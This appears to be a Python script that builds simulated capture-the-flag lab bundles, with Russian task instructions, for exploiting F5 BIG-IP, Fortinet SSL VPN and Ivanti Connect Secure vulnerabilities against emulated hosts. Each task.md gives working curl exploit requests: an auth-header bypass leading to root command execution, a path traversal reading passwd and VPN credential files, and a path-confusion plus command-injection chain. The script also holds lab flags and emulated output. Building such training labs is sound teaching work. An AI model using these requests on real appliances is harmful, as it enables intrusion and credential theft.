#!/usr/bin/env python3
"""Write lab bundles for S7 edge-appliance lessons (f5/fortinet/ivanti)."""
import json
import os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LABS = os.path.join(ROOT, 'content', 'labs')
WD = '/home/student/task'

def write(b):
    with open(os.path.join(LABS, b['id'] + '.json'), 'w', encoding='utf-8') as f:
        json.dump(b, f, ensure_ascii=False, indent=2)
        f.write('\n')

write({
    'id': 'web-f5-bigip',
    'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{f5_1c0ntr0l_r3st_h34d3r_byp4ss_r00t}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: F5 BIG-IP CVE-2022-1388\n\n"
            "Цель: `https://bigip.local`. Управление — iControl REST (`/mgmt/tm/`).\n\n"
            "1. Определи продукт по заголовку:\n"
            "   curl -s -k -I https://bigip.local/tmui/login.jsp\n\n"
            "2. Убедись, что без обхода эндпоинт закрыт (ждём 401):\n"
            "   curl -s -k -o /dev/null -w '%{http_code}\\n' https://bigip.local/mgmt/tm/util/bash\n\n"
            "3. Обойди аутентификацию заголовками и выполни команду:\n"
            "   curl -s -k -X POST 'https://bigip.local/mgmt/tm/util/bash' "
            "-H 'Connection: X-F5-Auth-Token' -H 'X-F5-Auth-Token: ' "
            "-H 'Content-Type: application/json' --data-binary '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'\n\n"
            "4. В ответе — вывод команды с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция bigip.local)', 'cases': [
        {'match': 'util/bash.*(run|utilCmdArgs|command)|utilCmdArgs',
         'example': "-s -k -X POST 'https://bigip.local/mgmt/tm/util/bash' -H 'Connection: X-F5-Auth-Token' --data-binary '{...}'",
         'output': ('{"kind":"tm:util:bash:runstate","command":"run","utilCmdArgs":"-c id",'
                    '"commandResult":"uid=0(root) gid=0(root) groups=0(root)\\n'
                    'nto{f5_1c0ntr0l_r3st_h34d3r_byp4ss_r00t}\\n"}\n')},
        {'match': 'util/bash',
         'example': "-s -k -o /dev/null -w '%{http_code}' https://bigip.local/mgmt/tm/util/bash",
         'output': '401\n'},
        {'match': 'tmui/login\\.jsp',
         'example': '-s -k -I https://bigip.local/tmui/login.jsp',
         'output': 'HTTP/2 200\nserver: BIG-IP\nset-cookie: BIGIPAuthCookie=; path=/; secure\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только bigip.local'}},
})

write({
    'id': 'web-fortinet-ssl-vpn',
    'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{f0rt1n3t_fgt_l4ng_sslvpn_s3ss10n_p4ssw0rds}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Fortinet CVE-2018-13379\n\n"
            "Цель: `https://fortigate.local`. Traversal — в параметре `lang` эндпоинта `/remote/fgt_lang`.\n\n"
            "1. Проверь обход пути — прочитай безобидный файл:\n"
            "   curl -s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../etc/passwd'\n\n"
            "2. Дочитай до сессионного файла (там логины и пароли пользователей VPN):\n"
            "   curl -s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession'\n\n"
            "3. В файле среди сессий — строка с флагом.\n"
            "   Сохрани флаг в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция fortigate.local)', 'cases': [
        {'match': 'sslvpn_websession',
         'example': "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession'",
         'output': ('var fgt_lang = "en";\n'
                    '172.16.1.50:443:user=jsmith:pass=SecretPass:...\n'
                    '10.0.0.7:443:user=admin:pass=Adm1nP@ss:...\n'
                    'nto{f0rt1n3t_fgt_l4ng_sslvpn_s3ss10n_p4ssw0rds}\n')},
        {'match': 'etc/passwd',
         'example': "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../etc/passwd'",
         'output': 'root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000::/home/admin:/bin/sh\n'},
        {'match': 'fgt_lang',
         'example': "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../..'",
         'output': 'var fgt_lang = "en";\n'},
        {'match': 'remote/login',
         'example': '-s -k -I https://fortigate.local/remote/login',
         'output': 'HTTP/2 200\nserver: xxxxxxxx-xxxxx\ncontent-type: text/html\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только fortigate.local'}},
})

write({
    'id': 'web-ivanti-connect',
    'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{1v4nt1_p4th_c0nfus10n_t0_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Ivanti CVE-2023-46805 + CVE-2024-21887\n\n"
            "Цель: `https://ivanti.local`. Цепочка: обход входа + инъекция команд.\n\n"
            "1. Убедись, что эндпоинт закрыт без обхода (ждём 401):\n"
            "   curl -s -k -o /dev/null -w '%{http_code}\\n' "
            "https://ivanti.local/api/v1/totp/user-backup-code/\n\n"
            "2. Обойди аутентификацию через path confusion (`/..;/`):\n"
            "   curl -s -k 'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information'\n\n"
            "3. Добавь командную инъекцию в поле cmd:\n"
            "   curl -s -k -X POST "
            "'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information' "
            "-H 'Content-Type: application/json' --data-binary '{\"cmd\":\"id\"}'\n\n"
            "4. В ответе — вывод команды с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция ivanti.local)', 'cases': [
        {'match': 'system-information.*cmd|cmd.*system-information|"cmd"',
         'example': "-s -k -X POST '.../totp/user-backup-code/;/../../system/system-information' --data-binary '{\"cmd\":\"id\"}'",
         'output': '{"result":"uid=0(root) gid=0(root) groups=0(root)\\nnto{1v4nt1_p4th_c0nfus10n_t0_rce}\\n"}\n'},
        {'match': ';/\\.\\./\\.\\./system|/;\\.\\./|system-information',
         'example': "-s -k 'https://ivanti.local/api/v1/totp/user-backup-code/;/../../system/system-information'",
         'output': '{"result":"system information (bypassed)","build":"22.6.1"}\n'},
        {'match': 'user-backup-code',
         'example': "-s -k -o /dev/null -w '%{http_code}' https://ivanti.local/api/v1/totp/user-backup-code/",
         'output': '401\n'},
        {'match': 'dana-na|ivanti\\.local/?$',
         'example': '-s -k -I https://ivanti.local/dana-na/auth/url_default/welcome.cgi',
         'output': 'HTTP/2 200\nserver: Ivanti Connect Secure\nset-cookie: DSID=; path=/; secure\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только ivanti.local'}},
})

print('s7 lab bundles written')
